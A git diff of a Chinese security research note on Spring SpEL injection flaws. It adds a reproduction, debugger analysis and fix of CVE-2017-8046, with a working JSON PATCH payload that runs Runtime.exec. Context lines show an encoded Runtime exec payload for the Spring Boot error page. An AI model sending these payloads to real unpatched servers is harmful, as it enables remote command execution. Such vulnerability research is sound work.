@@ -147,11 +147,9 @@ poc += ')}'
 print(poc)
 ```
 
-
-
 ## Error Page 表达式注入
 
-### 前提
+### 影响版本
 
 Springboot：
 
@@ -159,9 +157,9 @@ Springboot：
 - 1.2.0-1.2.7
 - 1.3.0
 
-错误页面有用户可控输出值
+同时要求错误页面有用户可控的输出值
 
-### 复现
+### 漏洞复现
 
 这里我采用springboot 1.2.0
 
@@ -188,7 +186,7 @@ ${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111, 11
 
 ![image-20220309111907959](../../assets/images/image-20220309111907959.png)
 
-### 分析
+### 漏洞分析
 
 先定位到`org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration.SpelView`，在`render`方法下打下断点：
 
@@ -216,7 +214,7 @@ ${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111, 11
 
 ![image-20220309134517443](../../assets/images/image-20220309134517443.png)
 
-### 修复
+### 漏洞修复
 
 [官方补丁](https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6)
 
@@ -232,19 +230,166 @@ ${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111, 11
 
 >Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。
 
-使用了**whitelabel views**，本质上和上面介绍的一样，不过多阐述。
+使用了**whitelabel views**，本质上和上面介绍的一样，不过说了。
 
-## CVE-2017-4971
-
-**Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）**
-
->Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。
 
 ## CVE-2017-8046
 
 **Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）**
 
 >Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中（实现[RFC6902](https://tools.ietf.org/html/rfc6902)），path的值被传入`setValue`，导致执行了SpEL表达式，触发远程命令执行漏洞。
+
+### 影响版本
+
+- Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3
+- Spring Boot version < 2.0.0M4
+- Spring Data release trains < Kay-RC3
+
+### 漏洞复现
+
+环境有两种方式搭建，一是选择[漏洞Demo jar包](https://github.com/cved-sources/cve-2017-8046/blob/master/build/spring-data-rest.jar)，然后本地运行并设置调试端口，二是下载源码修改版本，这里我选择后者。
+
+使用Spring官方教程：https://github.com/spring-guides/gs-accessing-data-rest.git
+下载后包含多个模块，使用其中的complete项目。
+
+修改pom依赖文件中的SpringBoot版本：
+
+```xml
+<parent>
+   <groupId>org.springframework.boot</groupId>
+   <artifactId>spring-boot-starter-parent</artifactId>
+   <version>1.5.6.RELEASE</version>
+   <relativePath/> <!-- lookup parent from repository -->
+</parent>
+```
+
+之后删除test下的**AccessingDataRestApplicationTests**，这里的**org.junit.jupiter.api**包会有一些问题。
+
+再加一个**application.properties**改一下端口，每次都和burpsuite占用了有点难受。
+
+运行**AccessingDataRestApplication**即可启动，页面返回：
+
+```json
+{
+  "_links" : {
+    "people" : {
+      "href" : "http://ty.com:8081/people{?page,size,sort}",
+      "templated" : true
+    },
+    "profile" : {
+      "href" : "http://ty.com:8081/profile"
+    }
+  }
+}
+```
+
+`/people`显示已有哪些创建了的用户，而`/profile`只有一个子目录`/profile/people`、其用来配置people页面的字段属性等信息。
+
+我们先使用**POST**创建一个用户：
+
+![image-20220313112240236](../../assets/images/image-20220313112240236.png)
+
+通过**GET**得到用户信息：
+
+```json
+{
+  "firstName" : "Zeryu",
+  "lastName" : "O",
+  "_links" : {
+    "self" : {
+      "href" : "http://ty.com:8081/people/1"
+    },
+    "person" : {
+      "href" : "http://ty.com:8081/people/1"
+    }
+  }
+}
+```
+
+ 而漏洞点在**PATCH**请求上，**PATCH**字面意思是补丁，实际上就是对原有数据的增删改查：
+
+如果我们原有数据：
+
+```json
+{
+  "A": "foo",
+  "B": "bar"
+}
+```
+
+发送这样的**PATCH**请求：
+
+```json
+[
+  { "op": "replace", "path": "/A", "value": "boo" },
+  { "op": "add", "path": "/C", "value": "demo" },
+  { "op": "remove", "path": "/B" }
+]
+```
+
+结果就会变为：
+
+```json
+{
+  "A": "Boo",
+  "C": "demo"
+}
+```
+
+在原先的例子上，我们发送一个**PATCH**请求：
+
+![image-20220313113329016](../../assets/images/image-20220313113329016.png)
+
+修改**path**值为恶意命令：
+
+```json
+[
+  { "op": "replace", 
+  "path": "T(java.lang.Runtime).getRuntime().exec('open -a Calculator')/lastName", 
+  "value": "HACKER" 
+ }
+]
+```
+
+注意在PATH中`/`不可缺少，后面分析会再说：
+
+![image-20220313113514050](../../assets/images/image-20220313113514050.png)
+
+### 漏洞分析
+
+我们定位到 **spring-data-rest-webmvc-2.6.6.RELEASE.jar**的 `org.springframework.data.rest.webmvc.config.JsonPatchHandler:apply()`
+
+![image-20220313135659875](../../assets/images/image-20220313135659875.png)
+
+这里判断了请求方法是否为 **PATCH**，然后判断Content-Type是否为**application/json-patch+json**，之后进入`applyPatch()`方法：
+
+![image-20220313150418090](../../assets/images/image-20220313150418090.png)
+
+以上调用链，我们把注意力放在第三个图里，其提取了op中的值，进入到对应的方法中
+
+![image-20220313153631626](../../assets/images/image-20220313153631626.png)
+
+这里对path中的`/`进行了分割，这也就解释了为什么path需要`/`，同时第一张图中4个赋值，最后的**spelExpression**也就是漏洞的关键，最后结束返回了一个**Patch**。
+
+之后，再一一回到最初的`this.getPatchOperations(source).apply(target, target.getClass())`的apply方法：
+
+![image-20220313183309493](../../assets/images/image-20220313183309493.png)
+
+之后进入spel的setValue方法，造成RCE。
+
+### 漏洞修复
+
+对path进行了合法性校验：
+
+```java
+String pathSource = Arrays.stream(path.split("/"))//
+        .filter(it -> !it.matches("\\d")) // no digits
+        .filter(it -> !it.equals("-")) // no "last element"s
+        .filter(it -> !it.isEmpty()) //
+        .collect(Collectors.joining("."));
+```
+
+
 
 ## CVE-2018-1270
 
@@ -253,6 +398,8 @@ ${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111, 11
 >spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，
 >
 >在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用`StandardEvaluationContext`解析，造成命令执行漏洞。
+
+
 
 ## CVE-2018-1273
 
